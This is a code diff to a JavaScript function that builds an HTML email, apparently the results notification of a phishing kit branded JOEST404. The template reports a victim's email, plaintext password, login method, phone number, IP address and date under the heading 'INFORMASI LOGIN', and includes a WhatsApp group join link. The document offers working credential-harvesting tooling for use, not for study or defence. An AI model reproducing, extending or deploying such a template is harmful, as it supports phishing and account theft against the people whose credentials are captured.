@@ -150,185 +150,143 @@ function buildHtml(vars) {
   return `
 
 
-
-            
-
-    <!DOCTYPE html><html>
+<!DOCTYPE html><html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width">
-<title>JOEST404</title>
-</head><body style="margin:0;padding:20px;background:#0a0a0a;font-family:Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0">
-<tr>
-<td align="center"><table width="650" cellpadding="0" cellspacing="0" border="0" style="
-background:#111111;
-border:1px solid #222222;
-border-radius:20px;
-overflow:hidden;
-"><tr>
-<td align="center" style="
-padding:50px 30px;
-border-bottom:1px solid #222222;
-"><div style="
-font-size:48px;
-font-weight:900;
-color:#ffffff;
-letter-spacing:6px;
-">
-JOEST404
-</div><div style="
-margin-top:10px;
-font-size:12px;
-letter-spacing:4px;
-color:#777777;
-">
-PRIVATE ACCESS RESS
-</div><div style="
-display:inline-block;
-margin-top:25px;
-padding:12px 24px;
-background:#06281b;
-border:1px solid #00ff99;
-border-radius:999px;
-color:#00ff99;
-font-size:13px;
-font-weight:bold;
-">
-● RESULT SUCCESS
-</div></td>
-</tr><tr>
-<td style="padding:35px;"><table width="100%" cellpadding="0" cellspacing="0"><tr>
-<td style="
-padding:16px 0;
-color:#888888;
-font-size:12px;
-font-weight:bold;
-letter-spacing:3px;
-">
-EMAIL
-</td><td align="right" style="
-padding:16px 0;
-color:#ffffff;
-font-size:16px;
-font-weight:600;
-">
-${vars.email}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+
+body{
+    margin:0;
+    padding:20px;
+    background:#1a1a1a;
+    font-family:Arial,sans-serif;
+}
+
+.tblResult{
+    width:100%;
+    max-width:650px;
+    margin:auto;
+    border-collapse:collapse;
+    background:#242424;
+    border:2px solid #d4af37;
+    border-radius:12px;
+    overflow:hidden;
+}
+
+.banner{
+    width:100%;
+    display:block;
+}
+
+.header{
+    background:#3a3a3a;
+    color:#d4af37;
+    text-align:center;
+    font-size:18px;
+    font-weight:bold;
+    letter-spacing:2px;
+    padding:18px;
+    border-bottom:2px solid #d4af37;
+}
+
+.tblResult td{
+    padding:14px;
+    border-bottom:1px solid #3a3a3a;
+    color:#f5f5f5;
+    font-size:14px;
+}
+
+.label{
+    width:35%;
+    color:#d4af37;
+    font-weight:bold;
+}
+
+.value{
+    color:#ffffff;
+    text-align:right;
+    font-weight:600;
+}
+
+.section{
+    background:#3a3a3a;
+    color:#d4af37;
+    text-align:center;
+    font-weight:bold;
+    letter-spacing:1px;
+}
+
+.join-box{
+    padding:20px;
+    background:#242424;
+}
+
+.join-btn{
+    display:block;
+    text-align:center;
+    text-decoration:none;
+    background:#d4af37;
+    color:#1a1a1a;
+    padding:15px;
+    border-radius:8px;
+    font-weight:bold;
+    letter-spacing:1px;
+}
+
+.footer{
+    background:#3a3a3a;
+    color:#d4af37;
+    text-align:center;
+    font-size:12px;
+    padding:15px;
+}
+
+</style></head><body><table class="tblResult"><tr>
+<td colspan="2" style="padding:0;">
+<img src="https://i.ibb.co/M750gDb/IMG-20220622-WA0144.jpg" class="banner">
 </td>
 </tr><tr>
-<td colspan="2">
-<hr style="border:none;border-top:1px solid #222222;">
+<td colspan="2" class="header">
+INFORMASI LOGIN
 </td>
 </tr><tr>
-<td style="
-padding:16px 0;
-color:#888888;
-font-size:12px;
-font-weight:bold;
-letter-spacing:3px;
-">
-PASSWORD
-</td><td align="right" style="
-padding:16px 0;
-color:#ffffff;
-font-size:16px;
-font-weight:600;
-">
-${vars.password}
+<td class="label">EMAIL</td>
+<td class="value">${vars.email}</td>
+</tr><tr>
+<td class="label">PASSWORD</td>
+<td class="value">${vars.password}</td>
+</tr><tr>
+<td class="label">LOGIN VIA</td>
+<td class="value">${vars.login}</td>
+</tr><tr>
+<td colspan="2" class="section">
+INFORMASI TAMBAHAN
 </td>
 </tr><tr>
-<td colspan="2">
-<hr style="border:none;border-top:1px solid #222222;">
-</td>
+<td class="label">PHONE</td>
+<td class="value">${vars.phone}</td>
 </tr><tr>
-<td style="
-padding:16px 0;
-color:#888888;
-font-size:12px;
-font-weight:bold;
-letter-spacing:3px;
-">
-LOGIN
-</td><td align="right" style="
-padding:16px 0;
-color:#ffffff;
-font-size:16px;
-font-weight:600;
-">
-${vars.login}
-</td>
+<td class="label">IP ADDRESS</td>
+<td class="value">${vars.ip}</td>
 </tr><tr>
-<td colspan="2">
-<hr style="border:none;border-top:1px solid #222222;">
-</td>
+<td class="label">DATE</td>
+<td class="value">${vars.date}</td>
 </tr><tr>
-<td style="
-padding:16px 0;
-color:#888888;
-font-size:12px;
-font-weight:bold;
-letter-spacing:3px;
-">
-PHONE
-</td><td align="right" style="
-padding:16px 0;
-color:#ffffff;
-font-size:16px;
-font-weight:600;
-">
-${vars.phone}
-</td>
-</tr><tr>
-<td colspan="2">
-<hr style="border:none;border-top:1px solid #222222;">
-</td>
-</tr><tr>
-<td style="
-padding:16px 0;
-color:#888888;
-font-size:12px;
-font-weight:bold;
-letter-spacing:3px;
-">
-IP ADDRESS
-</td><td align="right" style="
-padding:16px 0;
-color:#ffffff;
-font-size:16px;
-font-weight:600;
-">
-${vars.ip}
-</td>
-</tr></table></td>
-</tr><tr>
-<td style="padding:0 35px 35px 35px;"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
-style="
-display:block;
-text-align:center;
-padding:18px;
-background:#ffffff;
-color:#000000;
-text-decoration:none;
-font-weight:900;
-letter-spacing:2px;
-border-radius:12px;
-">
+<td colspan="2" class="join-box"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
+class="join-btn">
 JOIN WHATSAPP GROUP
 </a>
 
 </td>
 </tr><tr>
-<td align="center" style="
-padding:20px;
-border-top:1px solid #222222;
-font-size:12px;
-color:#666666;
-">
-© 2026 JOEST404 • Premium Notification System
+<td colspan="2" class="footer">
+© 2026 JOEST404 • PREMIUM NOTIFICATION SYSTEM
 </td>
-</tr></table></td>
-</tr>
-</table></body>
+</tr></table></body>
 </html>
+            
+
+    
 
 `;
 }
